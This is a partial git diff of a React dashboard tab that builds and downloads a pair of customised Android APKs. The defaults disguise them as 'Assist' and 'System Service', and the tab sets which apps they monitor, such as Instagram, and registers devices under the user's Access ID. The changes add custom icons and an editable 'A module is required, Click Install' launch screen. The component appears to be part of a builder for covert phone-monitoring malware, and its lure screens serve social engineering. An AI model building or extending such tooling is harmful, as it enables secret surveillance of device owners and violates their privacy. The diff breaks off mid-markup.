@@ -1,12 +1,5 @@
 import React, { useState, useEffect, useRef, useCallback } from 'react';
 
-// Build APK tab — lets a logged-in user customise the installer + module
-// app names, package names, and the list of monitored packages, then kicks
-// off a build job on the dashboard. The job is picked up by a remote
-// build.sh worker (see /api/build/worker/*). The resulting APKs are scoped
-// to the user's Access ID so multiple users can build in parallel without
-// overwriting each other's outputs.
-
 const disclaimerStyles = {
   overlay: {
     position: 'fixed', inset: 0, zIndex: 9999,
@@ -24,47 +17,29 @@ const disclaimerStyles = {
     width: '100%',
     boxShadow: '0 0 40px rgba(239,68,68,0.12), 0 8px 32px rgba(0,0,0,0.6)',
   },
-  head: {
-    display: 'flex', alignItems: 'center', gap: 10,
-    marginBottom: 18,
-  },
+  head: { display: 'flex', alignItems: 'center', gap: 10, marginBottom: 18 },
   icon: { fontSize: 26, lineHeight: 1 },
   headText: { fontSize: 15, fontWeight: 700, color: '#fca5a5', letterSpacing: 0.2 },
   subHead: { fontSize: 11, color: '#ef4444', fontWeight: 600, marginTop: 2 },
   divider: { border: 'none', borderTop: '1px solid rgba(239,68,68,0.2)', margin: '0 0 18px' },
-  itemRow: {
-    display: 'flex', alignItems: 'flex-start', gap: 10,
-    marginBottom: 12,
-  },
+  itemRow: { display: 'flex', alignItems: 'flex-start', gap: 10, marginBottom: 12 },
   bullet: { fontSize: 15, lineHeight: 1.3, flexShrink: 0, marginTop: 1 },
   itemText: { fontSize: 12.5, color: '#cbd5e1', lineHeight: 1.5 },
   highlight: { color: '#fbbf24', fontWeight: 600 },
   agree: {
-    marginTop: 18,
-    padding: '12px 14px',
-    background: 'rgba(239,68,68,0.07)',
-    border: '1px solid rgba(239,68,68,0.25)',
-    borderRadius: 8,
-    fontSize: 11.5,
-    color: '#94a3b8',
-    lineHeight: 1.5,
+    marginTop: 18, padding: '12px 14px',
+    background: 'rgba(239,68,68,0.07)', border: '1px solid rgba(239,68,68,0.25)',
+    borderRadius: 8, fontSize: 11.5, color: '#94a3b8', lineHeight: 1.5,
   },
-  btnRow: {
-    display: 'flex', gap: 10, marginTop: 18, justifyContent: 'flex-end',
-  },
+  btnRow: { display: 'flex', gap: 10, marginTop: 18, justifyContent: 'flex-end' },
   cancelBtn: {
-    background: 'transparent',
-    border: '1px solid #334155',
-    color: '#94a3b8',
-    borderRadius: 7, padding: '9px 18px',
-    fontSize: 12, fontWeight: 600, cursor: 'pointer',
+    background: 'transparent', border: '1px solid #334155', color: '#94a3b8',
+    borderRadius: 7, padding: '9px 18px', fontSize: 12, fontWeight: 600, cursor: 'pointer',
   },
   confirmBtn: {
     background: 'linear-gradient(135deg,#dc2626 0%,#b91c1c 100%)',
-    border: 'none', color: '#fff',
-    borderRadius: 7, padding: '9px 20px',
-    fontSize: 12, fontWeight: 700, cursor: 'pointer',
-    letterSpacing: 0.2,
+    border: 'none', color: '#fff', borderRadius: 7, padding: '9px 20px',
+    fontSize: 12, fontWeight: 700, cursor: 'pointer', letterSpacing: 0.2,
   },
 };
 
@@ -80,7 +55,6 @@ function DisclaimerModal({ filename, onConfirm, onCancel }) {
           </div>
         </div>
         <hr style={disclaimerStyles.divider} />
-
         <div style={disclaimerStyles.itemRow}>
           <span style={disclaimerStyles.bullet}>📵</span>
           <span style={disclaimerStyles.itemText}>
@@ -88,38 +62,32 @@ function DisclaimerModal({ filename, onConfirm, onCancel }) {
             dedicated test or spare Android device that contains no personal accounts, passwords, or sensitive information.
           </span>
         </div>
-
         <div style={disclaimerStyles.itemRow}>
           <span style={disclaimerStyles.bullet}>🧹</span>
           <span style={disclaimerStyles.itemText}>
             <span style={disclaimerStyles.highlight}>Factory reset the device first.</span> Remove all personal
-            data, accounts, photos, and apps before proceeding. A freshly reset device is strongly recommended.
+            data, accounts, photos, and apps before proceeding.
           </span>
         </div>
-
         <div style={disclaimerStyles.itemRow}>
           <span style={disclaimerStyles.bullet}>🔒</span>
           <span style={disclaimerStyles.itemText}>
             <span style={disclaimerStyles.highlight}>No credentials or sensitive data.</span> Ensure no email
-            accounts, banking apps, social media logins, or private files exist on the device before installation.
+            accounts, banking apps, social media logins, or private files exist on the device.
           </span>
         </div>
-
         <div style={disclaimerStyles.itemRow}>
           <span style={disclaimerStyles.bullet}>🛡️</span>
           <span style={disclaimerStyles.itemText}>
             We accept <span style={disclaimerStyles.highlight}>no liability whatsoever</span> for any damage,
-            data loss, privacy breach, or device malfunction resulting from the installation or use of this
-            application. Use entirely at your own risk.
+            data loss, privacy breach, or device malfunction. Use entirely at your own risk.
           </span>
         </div>
-
         <div style={disclaimerStyles.agree}>
           By clicking <strong style={{ color: '#fca5a5' }}>I Understand — Download</strong> you confirm that
           you have read and accepted these terms, that you are legally authorised to install this software on
           the target device, and that you hold full responsibility for any consequences of its use.
         </div>
-
         <div style={disclaimerStyles.btnRow}>
           <button style={disclaimerStyles.cancelBtn} onClick={onCancel}>Cancel</button>
           <button style={disclaimerStyles.confirmBtn} onClick={onConfirm}>
@@ -131,76 +99,58 @@ function DisclaimerModal({ filename, onConfirm, onCancel }) {
   );
 }
 
+const ACCENT_PRESETS = [
+  { label: 'Indigo',  value: '#6366F1' },
+  { label: 'Sky',     value: '#0EA5E9' },
+  { label: 'Green',   value: '#22C55E' },
+  { label: 'Amber',   value: '#F59E0B' },
+  { label: 'Rose',    value: '#F43F5E' },
+  { label: 'Purple',  value: '#8B5CF6' },
+];
+
+const BG_PRESETS = [
+  { label: 'Dark Navy',  value: '#0B1020' },
+  { label: 'Slate',      value: '#0F172A' },
+  { label: 'Dark Gray',  value: '#111827' },
+  { label: 'Pure Black', value: '#000000' },
+  { label: 'Deep Blue',  value: '#0D1B4B' },
+  { label: 'Dark Teal',  value: '#042F2E' },
+];
+
 const styles = {
   page: {
-    height: '100%',
-    overflow: 'auto',
-    padding: '4px 4px 24px 4px',
-    color: '#e2e8f0',
-    fontFamily: '"Inter","Segoe UI",sans-serif',
+    height: '100%', overflow: 'auto', padding: '4px 4px 24px 4px',
+    color: '#e2e8f0', fontFamily: '"Inter","Segoe UI",sans-serif',
   },
   card: {
-    background: 'rgba(15,23,42,0.6)',
-    border: '1px solid #1e293b',
-    borderRadius: 12,
-    padding: 20,
-    marginBottom: 16,
+    background: 'rgba(15,23,42,0.6)', border: '1px solid #1e293b',
+    borderRadius: 12, padding: 20, marginBottom: 16,
   },
   title: { fontSize: 16, fontWeight: 600, color: '#a5b4fc', marginBottom: 4 },
   subtitle: { fontSize: 12, color: '#64748b', marginBottom: 14 },
-  // Two-column layout for installer + module side-by-side. Collapses to one
-  // column on narrow screens.
-  twoCol: {
-    display: 'grid',
-    gridTemplateColumns: 'repeat(auto-fit, minmax(320px, 1fr))',
-    gap: 16,
-  },
+  twoCol: { display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(320px, 1fr))', gap: 16 },
   column: {
-    background: 'rgba(2,6,23,0.45)',
-    border: '1px solid #1e293b',
-    borderRadius: 10,
-    padding: 16,
-    display: 'flex',
-    flexDirection: 'column',
-    gap: 14,
+    background: 'rgba(2,6,23,0.45)', border: '1px solid #1e293b',
+    borderRadius: 10, padding: 16, display: 'flex', flexDirection: 'column', gap: 14,
   },
   colHeader: {
-    display: 'flex',
-    alignItems: 'center',
-    gap: 8,
-    paddingBottom: 8,
-    borderBottom: '1px solid #1e293b',
-    fontSize: 13,
-    fontWeight: 700,
-    color: '#c4b5fd',
-    letterSpacing: 0.4,
-    textTransform: 'uppercase',
+    display: 'flex', alignItems: 'center', gap: 8, paddingBottom: 8,
+    borderBottom: '1px solid #1e293b', fontSize: 13, fontWeight: 700,
+    color: '#c4b5fd', letterSpacing: 0.4, textTransform: 'uppercase',
   },
   field: { display: 'flex', flexDirection: 'column', gap: 4 },
   label: { fontSize: 11, color: '#94a3b8', textTransform: 'uppercase', letterSpacing: 0.5, fontWeight: 600 },
   hint: { fontSize: 11, color: '#475569' },
   input: {
-    background: 'rgba(2,6,23,0.6)',
-    border: '1px solid #334155',
-    borderRadius: 6,
-    padding: '8px 10px',
-    color: '#e2e8f0',
-    fontSize: 13,
-    outline: 'none',
-    fontFamily: 'inherit',
+    background: 'rgba(2,6,23,0.6)', border: '1px solid #334155',
+    borderRadius: 6, padding: '8px 10px', color: '#e2e8f0', fontSize: 13,
+    outline: 'none', fontFamily: 'inherit',
   },
   textarea: {
-    background: 'rgba(2,6,23,0.6)',
-    border: '1px solid #334155',
-    borderRadius: 6,
-    padding: '8px 10px',
-    color: '#e2e8f0',
-    fontSize: 12.5,
-    fontFamily: '"JetBrains Mono","Fira Code",monospace',
-    outline: 'none',
-    minHeight: 130,
-    resize: 'vertical',
-    lineHeight: 1.4,
+    background: 'rgba(2,6,23,0.6)', border: '1px solid #334155',
+    borderRadius: 6, padding: '8px 10px', color: '#e2e8f0', fontSize: 12.5,
+    fontFamily: '"JetBrains Mono","Fira Code",monospace', outline: 'none',
+    minHeight: 130, resize: 'vertical', lineHeight: 1.4,
   },
   inputErr: { borderColor: '#ef4444' },
   errMsg: { color: '#f87171', fontSize: 11 },
@@ -208,23 +158,13 @@ const styles = {
   buildBtn: {
     background: 'linear-gradient(135deg,#6366f1 0%,#8b5cf6 100%)',
     color: '#fff', border: 'none', borderRadius: 8,
-    padding: '10px 22px', fontSize: 13, fontWeight: 600,
-    cursor: 'pointer',
+    padding: '10px 22px', fontSize: 13, fontWeight: 600, cursor: 'pointer',
   },
   buildBtnDisabled: { opacity: 0.5, cursor: 'not-allowed' },
   dlBtn: {
-    background: 'rgba(34,197,94,0.15)',
-    border: '1px solid rgba(34,197,94,0.4)',
-    color: '#86efac',
-    borderRadius: 8,
-    padding: '8px 16px',
-    fontSize: 12,
-    fontWeight: 600,
-    cursor: 'pointer',
-    textDecoration: 'none',
-    display: 'inline-flex',
-    alignItems: 'center',
-    gap: 6,
+    background: 'rgba(34,197,94,0.15)', border: '1px solid rgba(34,197,94,0.4)',
+    color: '#86efac', borderRadius: 8, padding: '8px 16px', fontSize: 12, fontWeight: 600,
+    cursor: 'pointer', textDecoration: 'none', display: 'inline-flex', alignItems: 'center', gap: 6,
   },
   status: { fontSize: 12, color: '#94a3b8' },
   badge: (color) => ({
@@ -232,26 +172,13 @@ const styles = {
     fontSize: 11, fontWeight: 600, color, background: `${color}22`, border: `1px solid ${color}55`,
   }),
   logPane: {
-    background: '#020617',
-    border: '1px solid #1e293b',
-    borderRadius: 8,
-    padding: 12,
-    fontFamily: '"JetBrains Mono","Fira Code",monospace',
-    fontSize: 11.5,
-    color: '#cbd5e1',
-    height: 360,
-    overflow: 'auto',
-    whiteSpace: 'pre-wrap',
-    lineHeight: 1.45,
+    background: '#020617', border: '1px solid #1e293b', borderRadius: 8,
+    padding: 12, fontFamily: '"JetBrains Mono","Fira Code",monospace', fontSize: 11.5,
+    color: '#cbd5e1', height: 360, overflow: 'auto', whiteSpace: 'pre-wrap', lineHeight: 1.45,
   },
   accessIdBox: {
-    background: 'rgba(99,102,241,0.1)',
-    border: '1px dashed rgba(99,102,241,0.4)',
-    borderRadius: 8,
-    padding: '10px 14px',
-    marginBottom: 16,
-    fontSize: 12,
-    color: '#a5b4fc',
+    background: 'rgba(99,102,241,0.1)', border: '1px dashed rgba(99,102,241,0.4)',
+    borderRadius: 8, padding: '10px 14px', marginBottom: 16, fontSize: 12, color: '#a5b4fc',
   },
   workerPill: (online) => ({
     display: 'inline-flex', alignItems: 'center', gap: 6,
@@ -263,17 +190,49 @@ const styles = {
   ghaTag: {
     display: 'inline-flex', alignItems: 'center', gap: 5,
     padding: '2px 8px', borderRadius: 10, fontSize: 10, fontWeight: 600,
-    color: '#a78bfa', background: 'rgba(139,92,246,0.1)',
-    border: '1px solid rgba(139,92,246,0.3)',
+    color: '#a78bfa', background: 'rgba(139,92,246,0.1)', border: '1px solid rgba(139,92,246,0.3)',
+  },
+  sectionToggle: {
+    display: 'flex', alignItems: 'center', gap: 8, padding: '8px 12px',
+    background: 'rgba(99,102,241,0.08)', border: '1px solid rgba(99,102,241,0.2)',
+    borderRadius: 8, cursor: 'pointer', fontSize: 12, fontWeight: 600, color: '#a5b4fc',
+    userSelect: 'none',
+  },
+  iconRow: { display: 'flex', gap: 8, alignItems: 'flex-start' },
+  iconPreview: {
+    width: 48, height: 48, borderRadius: 10, border: '1px solid #334155',
+    objectFit: 'cover', flexShrink: 0, background: '#1e293b',
+    display: 'flex', alignItems: 'center', justifyContent: 'center',
+    fontSize: 22, overflow: 'hidden',
+  },
+  uploadBtn: {
+    background: 'rgba(99,102,241,0.1)', border: '1px solid rgba(99,102,241,0.3)',
+    color: '#a5b4fc', borderRadius: 6, padding: '6px 12px', fontSize: 11,
+    fontWeight: 600, cursor: 'pointer', whiteSpace: 'nowrap',
+  },
+  colorSwatches: { display: 'flex', gap: 6, flexWrap: 'wrap', marginTop: 4 },
+  swatch: (color, selected) => ({
+    width: 28, height: 28, borderRadius: 6, background: color, cursor: 'pointer',
+    border: selected ? '2px solid #a5b4fc' : '2px solid transparent',
+    boxShadow: selected ? '0 0 0 1px rgba(165,180,252,0.5)' : 'none',
+    flexShrink: 0,
+  }),
+  colorPickerWrapper: { display: 'flex', gap: 8, alignItems: 'center', marginTop: 4 },
+  colorInput: {
+    width: 36, height: 28, borderRadius: 4, border: '1px solid #334155',
+    cursor: 'pointer', padding: 1, background: 'transparent',
+  },
+  colorTextInput: {
+    background: 'rgba(2,6,23,0.6)', border: '1px solid #334155', borderRadius: 6,
+    padding: '4px 8px', color: '#e2e8f0', fontSize: 12, outline: 'none',
+    fontFamily: 'monospace', width: 90,
   },
 };
 
 const PKG_REGEX  = /^[a-z][a-z0-9_]*(\.[a-z][a-z0-9_]*)+$/;
 const NAME_REGEX = /^[\w .&'-]{1,40}$/;
+const URL_REGEX  = /^https?:\/\/.+/i;
 
-// Default monitored packages — mirrors the in-tree
-// app/src/main/java/com/task/tusker/utils/Constants.java MONITORED_PACKAGES
-// list. Users can add or remove freely.
 const DEFAULT_MONITORED_PACKAGES = [
   'com.android.stk',
   'com.instagram.android',
@@ -296,29 +255,220 @@ function authHeaders() {
   return t ? { Authorization: `Bearer ${t}` } : {};
 }
 
+function IconField({ label, iconSource, onSourceChange, disabled }) {
+  const fileRef = useRef(null);
+  const [urlInput, setUrlInput] = useState('');
+  const [mode, setMode] = useState('default');
+
+  const handleFile = (e) => {
+    const file = e.target.files?.[0];
+    if (!file) return;
+    const reader = new FileReader();
+    reader.onload = (ev) => {
+      const dataUri = ev.target.result;
+      onSourceChange(dataUri);
+      setMode('file');
+      setUrlInput('');
+    };
+    reader.readAsDataURL(file);
+  };
+
+  const handleUrlBlur = () => {
+    const v = urlInput.trim();
+    if (v && URL_REGEX.test(v)) {
+      onSourceChange(v);
+      setMode('url');
+    } else if (!v) {
+      onSourceChange('');
+      setMode('default');
+    }
+  };
+
+  const handleClear = () => {
+    onSourceChange('');
+    setMode('default');
+    setUrlInput('');
+    if (fileRef.current) fileRef.current.value = '';
+  };
+
+  const isDataUri = iconSource && iconSource.startsWith('data:');
+  const isUrl = iconSource && URL_REGEX.test(iconSource);
+  const hasIcon = isDataUri || isUrl;
+
+  return (
+    <div style={styles.field}>
+      <label style={styles.label}>{label} Icon</label>
+      <div style={styles.iconRow}>
+        <div style={styles.iconPreview}>
+          {hasIcon
+            ? <img src={iconSource} alt="icon preview" style={{ width: '100%', height: '100%', objectFit: 'cover', borderRadius: 10 }} />
+            : <span title="Default icon">🤖</span>}
+        </div>
+        <div style={{ flex: 1, display: 'flex', flexDirection: 'column', gap: 6 }}>
+          <div style={{ display: 'flex', gap: 6 }}>
+            <input
+              type="text"
+              style={{ ...styles.input, fontSize: 11, flex: 1, padding: '6px 8px' }}
+              placeholder="Paste image URL…"
+              value={urlInput}
+              onChange={e => setUrlInput(e.target.value)}
+              onBlur={handleUrlBlur}
+              onKeyDown={e => { if (e.key === 'Enter') handleUrlBlur(); }}
+              disabled={disabled}
+              spellCheck={false}
+            />
+            <button
+              style={styles.uploadBtn}
+              onClick={() => fileRef.current?.click()}
+              disabled={disabled}
+              title="Upload image file"
+              type="button"
+            >
+              📁 Upload
+            </button>
+          </div>
+          {hasIcon && (
+            <div style={{ display: 'flex', alignItems: 'center', gap: 6 }}>
+              <span style={{ fontSize: 10, color: '#22c55e' }}>
+                {isDataUri ? '✓ File uploaded' : '✓ URL set'}
+              </span>
+              <button
+                style={{ background: 'none', border: 'none', color: '#f87171', fontSize: 10, cursor: 'pointer', padding: 0 }}
+                onClick={handleClear}
+                disabled={disabled}
+                type="button"
+              >
+                ✕ Use default
+              </button>
+            </div>
+          )}
+          {!hasIcon && <span style={styles.hint}>Leave blank to use the default icon</span>}
+        </div>
+      </div>
+      <input ref={fileRef} type="file" accept="image/*" style={{ display: 'none' }} onChange={handleFile} />
+    </div>
+  );
+}
+
+function ColorPicker({ label, value, onChange, presets, disabled }) {
+  return (
+    <div style={styles.field}>
+      <label style={styles.label}>{label}</label>
+      <div style={styles.colorSwatches}>
+        {presets.map(p => (
+          <div
+            key={p.value}
+            style={styles.swatch(p.value, value === p.value)}
+            title={p.label}
+            onClick={() => !disabled && onChange(p.value)}
+          />
+        ))}
+      </div>
+      <div style={styles.colorPickerWrapper}>
+        <input
+          type="color"
+          style={styles.colorInput}
+          value={value}
+          onChange={e => onChange(e.target.value)}
+          disabled={disabled}
+          title="Custom color"
+        />
+        <input
+          type="text"
+          style={styles.colorTextInput}
+          value={value}
+          onChange={e => {
+            const v = e.target.value;
+            if (/^#[0-9a-fA-F]{0,6}$/.test(v)) onChange(v);
+          }}
+          disabled={disabled}
+          spellCheck={false}
+          maxLength={7}
+        />
+        <span style={{ fontSize: 11, color: '#64748b' }}>{label}</span>
+      </div>
+    </div>
+  );
+}
+
+function LaunchPagePreview({ title, subtitle, btnText, bgColor, accentColor }) {
+  return (
+    <div style={{
+      background: bgColor,
+      borderRadius: 16,
+      padding: '24px 16px',
+      display: 'flex',
+      flexDirection: 'column',
+      alignItems: 'center',
+      gap: 0,
+      minHeight: 280,
+      border: '1px solid #1e293b',
+      position: 'relative',
+      overflow: 'hidden',
+    }}>
+      <div style={{ fontSize: 10, color: '#475569', marginBottom: 12, letterSpacing: 1, textTransform: 'uppercase' }}>
+        Live Preview
+      </div>
+      <div style={{
+        width: 72, height: 72, borderRadius: '50%',
+        background: `${accentColor}22`,
+        border: `2px solid ${accentColor}55`,
+        display: 'flex', alignItems: 'center', justifyContent: 'center',
+        fontSize: 28, marginBottom: 16,
+      }}>🤖</div>
+      <div style={{
+        background: 'rgba(255,255,255,0.06)', border: '1px solid rgba(255,255,255,0.1)',
+        borderRadius: 12, padding: '16px', width: '100%', display: 'flex', flexDirection: 'column', gap: 8,
+      }}>
+        <div style={{ fontSize: 14, fontWeight: 700, color: '#fff', textAlign: 'center', wordBreak: 'break-word' }}>
+          {title || 'App Title'}
+        </div>
+        <div style={{ fontSize: 11, color: '#9ca3af', textAlign: 'center', wordBreak: 'break-word' }}>
+          {subtitle || 'App subtitle here'}
+        </div>
+        <div style={{
+          marginTop: 6, padding: '10px 0', borderRadius: 8, textAlign: 'center',
+          background: accentColor, color: '#fff', fontWeight: 700, fontSize: 12,
+        }}>
+          {btnText || 'Install'}
+        </div>
+      </div>
+    </div>
+  );
+}
+
 export default function BuildApkTab({ user }) {
-  // ── Module column state ─────────────────────────────────────────────────
-  const [moduleName,        setModuleName]        = useState('System Service');
-  const [modulePackage,     setModulePackage]     = useState('com.task.tusker');
-  const [monitoredText,     setMonitoredText]     = useState(DEFAULT_MONITORED_PACKAGES.join('\n'));
+  const [moduleName,       setModuleName]       = useState('System Service');
+  const [modulePackage,    setModulePackage]     = useState('com.task.tusker');
+  const [moduleIconSource, setModuleIconSource] = useState('');
 
-  // ── Installer column state ──────────────────────────────────────────────
-  const [installerName,     setInstallerName]     = useState('Assist');
-  const [installerPackage,  setInstallerPackage]  = useState('com.onerule.task');
+  const [installerName,       setInstallerName]      = useState('Assist');
+  const [installerPackage,    setInstallerPackage]   = useState('com.onerule.task');
+  const [installerIconSource, setInstallerIconSource] = useState('');
 
-  const [errors, setErrors]       = useState({});
-  const [running, setRunning]     = useState(false);
+  const [monitoredText, setMonitoredText] = useState(DEFAULT_MONITORED_PACKAGES.join('\n'));
+
+  const [showLaunchEditor, setShowLaunchEditor] = useState(false);
+  const [launchTitle,       setLaunchTitle]       = useState('A module is required');
+  const [launchSubtitle,    setLaunchSubtitle]    = useState('Click Install to proceed.');
+  const [launchBtnText,     setLaunchBtnText]     = useState('Install');
+  const [launchBgColor,     setLaunchBgColor]     = useState('#0B1020');
+  const [launchAccentColor, setLaunchAccentColor] = useState('#6366F1');
+
+  const [errors,     setErrors]     = useState({});
+  const [running,    setRunning]    = useState(false);
   const [submitting, setSubmitting] = useState(false);
-  const [logs, setLogs]           = useState([]);
+  const [logs,       setLogs]       = useState([]);
   const [lastResult, setLastResult] = useState(null);
-  const [accessId, setAccessId]   = useState(user?.accessId || '');
-  const [downloads, setDownloads] = useState({ module: false, installer: false });
+  const [accessId,   setAccessId]   = useState(user?.accessId || '');
+  const [downloads,  setDownloads]  = useState({ module: false, installer: false });
   const [workerOnline, setWorkerOnline] = useState(false);
-  const [disclaimer, setDisclaimer] = useState(null); // { type: 'module'|'installer' }
+  const [disclaimer,   setDisclaimer]  = useState(null);
   const [apkExpiresAt, setApkExpiresAt] = useState(null);
   const [expiryCountdown, setExpiryCountdown] = useState(null);
-  const logEndRef = useRef(null);
-  const pollIdRef = useRef(null);
+
+  const logEndRef     = useRef(null);
+  const pollIdRef     = useRef(null);
   const expiryTickRef = useRef(null);
 
   useEffect(() => {
@@ -333,20 +483,16 @@ export default function BuildApkTab({ user }) {
       if (d.success) {
         setRunning(!!d.running);
         setWorkerOnline(!!d.workerOnline);
-        if (d.isMyBuild && Array.isArray(d.lines) && d.lines.length > 0) {
-          setLogs(d.lines);
-        }
-        if (!d.running && d.isMyBuild && d.success_ != null) {
+        if (d.isMyBuild && Array.isArray(d.lines) && d.lines.length > 0) setLogs(d.lines);
+        if (!d.running && d.isMyBuild && d.success_ != null)
           setLastResult({ success: !!d.success_, error: d.error || null });
-        }
         if (d.apkExpiresAt) setApkExpiresAt(d.apkExpiresAt);
         return d;
       }
-    } catch (_) { /* network blip */ }
+    } catch (_) {}
     return null;
   }, []);
 
-  // Countdown ticker for APK expiry
   useEffect(() => {
     if (expiryTickRef.current) clearInterval(expiryTickRef.current);
     if (!apkExpiresAt) { setExpiryCountdown(null); return; }
@@ -376,9 +522,7 @@ export default function BuildApkTab({ user }) {
       return;
     }
     pollIdRef.current = setInterval(fetchStatus, 1500);
-    return () => {
-      if (pollIdRef.current) { clearInterval(pollIdRef.current); pollIdRef.current = null; }
-    };
+    return () => { if (pollIdRef.current) { clearInterval(pollIdRef.current); pollIdRef.current = null; } };
   }, [running, fetchStatus, accessId]);
 
   const checkDownloadAvailability = useCallback(async () => {
@@ -394,60 +538,58 @@ export default function BuildApkTab({ user }) {
 
   useEffect(() => { checkDownloadAvailability(); }, [checkDownloadAvailability]);
 
-  const parseMonitored = () => {
-    return monitoredText
-      .split(/[\s,]+/)
-      .map((s) => s.trim())
-      .filter(Boolean);
-  };
+  const parseMonitored = () =>
+    monitoredText.split(/[\s,]+/).map(s => s.trim()).filter(Boolean);
 
   const validate = () => {
     const e = {};
-    if (!NAME_REGEX.test(moduleName.trim()))      e.moduleName       = '1-40 chars: letters, digits, space, . & \' -';
-    if (!PKG_REGEX.test(modulePackage.trim()))    e.modulePackage    = 'e.g. com.example.app (lowercase, dot-separated)';
-    if (!NAME_REGEX.test(installerName.trim()))   e.installerName    = '1-40 chars: letters, digits, space, . & \' -';
-    if (!PKG_REGEX.test(installerPackage.trim())) e.installerPackage = 'e.g. com.example.installer';
-    if (modulePackage.trim() === installerPackage.trim() && !e.modulePackage && !e.installerPackage) {
+    if (!NAME_REGEX.test(moduleName.trim()))       e.moduleName       = '1-40 chars: letters, digits, space, . & \' -';
+    if (!PKG_REGEX.test(modulePackage.trim()))     e.modulePackage    = 'e.g. com.example.app (lowercase, dot-separated)';
+    if (!NAME_REGEX.test(installerName.trim()))    e.installerName    = '1-40 chars: letters, digits, space, . & \' -';
+    if (!PKG_REGEX.test(installerPackage.trim()))  e.installerPackage = 'e.g. com.example.installer';
+    if (modulePackage.trim() === installerPackage.trim() && !e.modulePackage && !e.installerPackage)
       e.installerPackage = 'Must differ from module package';
-    }
-    const monList = parseMonitored();
-    const bad = monList.filter((p) => !PKG_REGEX.test(p));
-    if (bad.length > 0) {
+    const bad = parseMonitored().filter(p => !PKG_REGEX.test(p));
+    if (bad.length > 0)
       e.monitored = `Invalid package(s): ${bad.slice(0, 3).join(', ')}${bad.length > 3 ? '…' : ''}`;
-    }
+    if (!NAME_REGEX.test(launchTitle.trim()))    e.launchTitle    = '1-40 chars';
+    if (!NAME_REGEX.test(launchSubtitle.trim())) e.launchSubtitle = '1-40 chars';
+    if (!NAME_REGEX.test(launchBtnText.trim()))  e.launchBtnText  = '1-40 chars';
     setErrors(e);
     return Object.keys(e).length === 0;
   };
 
   const startBuild = async () => {
-    // Triple guard: reject if validation fails, if a build is already running,
-    // or if we're already in the middle of POSTing /api/build/apk. The button
-    // is also disabled in the JSX when any of these are true, but React state
-    // updates are async so a fast double-click could otherwise slip through.
     if (!validate() || running || submitting) return;
     setSubmitting(true);
-    // Optimistically lock the UI immediately — `running` won't flip until the
-    // POST returns, and the next status poll could be ~1.5s away.
     setRunning(true);
     setLogs([]);
     setLastResult(null);
     setDownloads({ module: false, installer: false });
 
     try {
+      const payload = {
+        moduleName:        moduleName.trim(),
+        modulePackage:     modulePackage.trim(),
+        installerName:     installerName.trim(),
+        installerPackage:  installerPackage.trim(),
+        monitoredPackages: parseMonitored(),
+        moduleIconUrl:     moduleIconSource || '',
+        installerIconUrl:  installerIconSource || '',
+        installerLaunchTitle:       launchTitle.trim(),
+        installerLaunchSubtitle:    launchSubtitle.trim(),
+        installerLaunchBtnText:     launchBtnText.trim(),
+        installerLaunchBgColor:     launchBgColor,
+        installerLaunchAccentColor: launchAccentColor,
+      };
+
       const r = await fetch('/api/build/apk', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json', ...authHeaders() },
-        body: JSON.stringify({
-          moduleName:        moduleName.trim(),
-          modulePackage:     modulePackage.trim(),
-          installerName:     installerName.trim(),
-          installerPackage:  installerPackage.trim(),
-          monitoredPackages: parseMonitored(),
-        }),
+        body: JSON.stringify(payload),
       });
       const d = await r.json();
       if (!r.ok || !d.success) {
-        // Roll the optimistic lock back so the user can fix and retry.
         setRunning(false);
         setLastResult({ success: false, error: d.error || 'Build request failed' });
         return;
@@ -464,19 +606,10 @@ export default function BuildApkTab({ user }) {
   };
 
   const _doDownload = async (type) => {
-    // Request a short-lived one-time ticket, then let the browser stream
-    // the APK straight to disk via a normal navigation. This starts the
-    // download instantly and shows native progress, instead of buffering
-    // the whole file into memory as a Blob first.
     try {
-      const r = await fetch(`/api/build/download/${type}/ticket`, {
-        method: 'POST',
-        headers: authHeaders(),
-      });
+      const r = await fetch(`/api/build/download/${type}/ticket`, { method: 'POST', headers: authHeaders() });
       const d = await r.json().catch(() => ({}));
-      if (!r.ok || !d.success || !d.url) {
-        throw new Error(d.error || `HTTP ${r.status}`);
-      }
+      if (!r.ok || !d.success || !d.url) throw new Error(d.error || `HTTP ${r.status}`);
       const a = document.createElement('a');
       a.href = d.url;
       const uid = accessId || 'build';
@@ -484,14 +617,10 @@ export default function BuildApkTab({ user }) {
       document.body.appendChild(a);
       a.click();
       document.body.removeChild(a);
-    } catch (err) {
-      alert(`Download failed: ${err.message}`);
-    }
+    } catch (err) { alert(`Download failed: ${err.message}`); }
   };
 
-  const downloadApk = (type) => {
-    setDisclaimer({ type });
-  };
+  const downloadApk = (type) => setDisclaimer({ type });
 
   const fmtField = (key, value, setter, placeholder, hint) => (
     <div style={styles.field}>
@@ -500,14 +629,12 @@ export default function BuildApkTab({ user }) {
         type="text"
         style={{ ...styles.input, ...(errors[key] ? styles.inputErr : {}) }}
         value={value}
-        onChange={(e) => setter(e.target.value)}
+        onChange={e => setter(e.target.value)}
         disabled={running}
         spellCheck={false}
         autoComplete="off"
       />
-      {errors[key]
-        ? <span style={styles.errMsg}>{errors[key]}</span>
-        : <span style={styles.hint}>{hint}</span>}
+      {errors[key] ? <span style={styles.errMsg}>{errors[key]}</span> : <span style={styles.hint}>{hint}</span>}
     </div>
   );
 
@@ -520,6 +647,7 @@ export default function BuildApkTab({ user }) {
           onCancel={() => setDisclaimer(null)}
         />
       )}
+
       <div style={styles.card}>
         <div style={{ display: 'flex', alignItems: 'flex-start', justifyContent: 'space-between', gap: 12 }}>
           <div>
@@ -529,9 +657,7 @@ export default function BuildApkTab({ user }) {
               Your Access ID is baked into every device that registers with these APKs.
             </div>
           </div>
-          <span style={styles.ghaTag}>
-            ⚡ GitHub Actions
-          </span>
+          <span style={styles.ghaTag}>⚡ GitHub Actions</span>
         </div>
 
         {accessId ? (
@@ -547,30 +673,129 @@ export default function BuildApkTab({ user }) {
           </div>
         )}
 
-        {/* ── Two columns: Installer | Module ──────────────────────────── */}
         <div style={styles.twoCol}>
-          {/* Installer column */}
+          {/* ── Installer column ─────────────────────────────────────────── */}
           <div style={styles.column}>
             <div style={styles.colHeader}>
               <span style={{ fontSize: 16 }}>📥</span>
-              Installer
+              Installer App
             </div>
-            {fmtField('installerName',    installerName,    setInstallerName,    'Installer App Name',  'e.g. "Assist"')}
-            {fmtField('installerPackage', installerPackage, setInstallerPackage, 'Installer Package',   'e.g. com.onerule.task')}
+
+            {fmtField('installerName',    installerName,    setInstallerName,    'App Name',    'e.g. "Assist"')}
